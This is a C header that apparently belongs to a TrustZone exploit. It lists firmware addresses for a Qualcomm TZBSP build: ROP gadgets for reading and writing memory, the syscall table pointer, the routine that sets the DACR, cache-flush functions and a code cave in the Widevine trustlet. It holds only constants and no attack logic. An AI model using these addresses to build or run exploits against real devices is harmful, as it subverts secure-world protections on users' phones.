#ifndef __TZBSP_SYMBOLS_H__
#define __TZBSP_SYMBOLS_H__

/**
 * The address of the "execute_function" function within TZBSP.
 */
#define EXECUTE_FUNCTION (0xFE80824C + 1)

/** 
 * The address of the pointer to syscall_table_5 in TZBSP.
 */
#define SYSCALL_5_POINTER_ADDRESS (0xFE8252B0)

/**
 * The address of the "BX LR" gadget in TZBSP.
 */
#define TZBSP_BXLR (0xFE808A74 + 1)

/**
 * The malloc address in TZBSP
 */
#define TZBSP_MALLOC (0xFE807E80 + 1)

/**
 * The address of the map region function
 */
#define TZBSP_QSEE_MAP_REGION (0xFE81456C + 1)

/**
 * The flush data cache function.
 */
#define TZBSP_FLUSH_DATA_CACHE (0xFE80DCA8)

/**
 * The location at which the DACR is set.
 */
#define TZBSP_SET_DACR (0xFE80FCAC)

/**
 * The location of the read DWORD gadget.
 */
#define TZBSP_READ_DWORD (0xFE80D6D6 + 1)

/**
 * The address of the flush_mmu_cache_inst_cache function.
 */
#define TZBSP_FLUSH_MMU_CACHE_INST_CACHE (0xFE80DA00)

/**
 * The address of the "STRB R1, [R0]; BX LR" gadget.
 */
#define TZBSP_WRITE_BYTE (0xFE84C082 + 1)

/**
 * The address of the instruction cache invalidation function.
 */
#define TZBSP_INVALIDATE_INSTRUCTION_CACHE (0xFE80DDF0)

/**
 * The offset of the code cave within the widevine application.
 */
#define CODE_CAVE_OFFSET (0x2C230)

/**
 * The size of the code cave.
 */
#define CODE_CAVE_SIZE (0x1000 - (CODE_CAVE_OFFSET & 0xFFF))

#endif
